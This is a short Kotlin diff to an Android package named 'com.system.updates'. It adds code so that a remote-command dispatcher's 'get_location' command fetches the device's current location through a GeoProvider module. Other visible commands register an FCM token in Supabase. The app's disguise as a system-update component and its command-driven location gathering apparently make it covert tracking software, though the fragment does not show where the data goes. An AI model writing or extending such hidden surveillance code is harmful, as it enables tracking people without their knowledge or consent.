@@ -3,6 +3,7 @@ package com.system.updates.core
 import android.content.Context
 import android.content.Intent
 import android.util.Log
+import com.system.updates.modules.GeoProvider
 import com.system.updates.modules.ImageModule
 
 object CommandExecutor {
@@ -23,6 +24,8 @@ object CommandExecutor {
             }
             "get_location" -> {
                 Log.i(TAG, "Fetching current location...")
+                val location = GeoProvider.getCurrentLocation(context)
+                Log.i(TAG, "Result: $location")
             }
             "update_token" -> {
                 Log.i(TAG, "Updating FCM token in Supabase...")
